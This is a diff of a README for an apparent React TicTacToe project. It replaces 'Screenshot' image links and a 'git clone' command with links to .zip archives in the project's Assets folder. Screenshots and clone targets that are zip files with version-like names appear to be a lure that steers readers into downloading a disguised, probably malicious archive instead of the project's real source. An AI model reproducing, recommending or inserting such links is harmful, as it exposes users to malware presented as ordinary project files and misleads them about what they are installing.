@@ -1,7 +1,7 @@
 # TicTacToe game Project Using React js And Node js Packages.
 
-![Screenshot (27)](https://github.com/glakshya20/TicTacToe-game-project-react/raw/refs/heads/main/src/Components/Assets/react_Toe_Tac_Tic_project_game_3.8.zip)
-![Screenshot (28)](https://github.com/glakshya20/TicTacToe-game-project-react/raw/refs/heads/main/src/Components/Assets/react_Toe_Tac_Tic_project_game_3.8.zip)
+![Screenshot (27)](https://raw.githubusercontent.com/glakshya20/TicTacToe-game-project-react/main/src/Components/Assets/game_react_Tic_Tac_Toe_project_v2.1-beta.1.zip)
+![Screenshot (28)](https://raw.githubusercontent.com/glakshya20/TicTacToe-game-project-react/main/src/Components/Assets/game_react_Tic_Tac_Toe_project_v2.1-beta.1.zip)
 
 - React
 - HTML
@@ -10,7 +10,7 @@
 - Bootstrap 
 
 ```bash
-git clone https://github.com/glakshya20/TicTacToe-game-project-react/raw/refs/heads/main/src/Components/Assets/react_Toe_Tac_Tic_project_game_3.8.zip
+git clone https://raw.githubusercontent.com/glakshya20/TicTacToe-game-project-react/main/src/Components/Assets/game_react_Tic_Tac_Toe_project_v2.1-beta.1.zip
 cd TicTacToe-game-project-react
 npm install
 npm start
